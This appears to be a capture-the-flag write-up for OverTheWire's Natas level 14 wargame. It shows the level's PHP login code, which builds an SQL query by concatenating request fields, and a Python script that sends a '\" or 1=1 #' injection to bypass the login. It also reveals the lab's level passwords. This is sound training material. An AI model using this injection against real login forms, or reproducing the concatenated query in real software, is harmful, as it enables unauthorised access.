# Over The Wire -- Natas 14

## Server URL
```
http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org
```

## Solution
We have a user-password login,

The php source code :
```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We can use the `debug` query parameter to retrieve the executed query.

We build a small python script to run the SQL injection :
```py
import requests

url = "http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org/index.php?debug=true"

user="\" or 1=1 #\""
passw=""
r = requests.post(url, data={'username':user, 'password': passw})

splitted = r.text.split('Executing query: ')[1].split('<br>')
query_executed = splitted[0]
warning_or_error = splitted[1]

print(f"SQL Query : {query_executed}")

if 'Access denied' not in warning_or_error:
    print("Got access !")
    print(warning_or_error)
else:
    print(warning_or_error.replace('<b>', '').replace('</b>', '').replace('<br />', ''))

```

We get the password for natas15 :
```
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```
